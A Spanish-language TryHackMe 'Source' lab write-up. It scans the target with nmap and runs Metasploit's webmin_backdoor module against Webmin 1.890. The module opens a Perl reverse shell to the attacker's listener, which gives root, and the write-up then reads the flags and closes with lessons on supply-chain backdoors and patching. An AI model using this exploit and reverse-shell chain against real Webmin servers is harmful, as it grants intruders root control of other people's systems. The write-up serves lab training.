---
title: "TryHackMe: Source"
category: "TryHackMe"
order: 19
tags: ["tryhackme", "webmin", "metasploit", "supply-chain"]
layout: layouts/writeup.njk
permalink: /writeups/thm-source.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.51.248
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

## user.txt

La versión de SSH no resulta vulnerable, así que el foco pasa a **Webmin** (puerto 10000). Buscando en Metasploit hay varios exploits disponibles para esa versión; varios requieren contraseña, pero uno de ellos no la requiere:

```bash
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.8.66.213:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened

id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty; pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/# cd /home/dark
root@source:/home/dark# cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

> Importante: hay que activar SSL (`true`) en el exploit y usar la interfaz `tun`, al menos en este tipo de rooms de TryHackMe.

**Flag user:** `THM{SUPPLY_CHAIN_COMPROMISE}`

## root.txt

El backdoor de Webmin da acceso directo como `root` — no fue necesario escalar privilegios por separado. Confirmando con `sudo -l`:

```bash
root@source:/home/dark# sudo -l
User root may run the following commands on source:
    (ALL : ALL) ALL

root@source:/home/dark# cd /root
root@source:~# cat root.txt
THM{UPDATE_YOUR_INSTALL}
```

**Flag root:** `THM{UPDATE_YOUR_INSTALL}`

## Lecciones aprendidas

- El nombre de la flag (`SUPPLY_CHAIN_COMPROMISE`) resume bien el escenario: un backdoor insertado en el propio código fuente de Webmin (ataque de cadena de suministro real que ocurrió en versiones específicas del software), no una vulnerabilidad de configuración.
- No todos los exploits de Metasploit requieren credenciales — vale la pena revisar cada módulo disponible antes de asumir que se necesita fuerza bruta.
- Mantener el software de administración remota (Webmin, cPanel, etc.) actualizado es crítico, ya que este tipo de backdoors suelen pasar desapercibidos hasta que se hacen públicos.
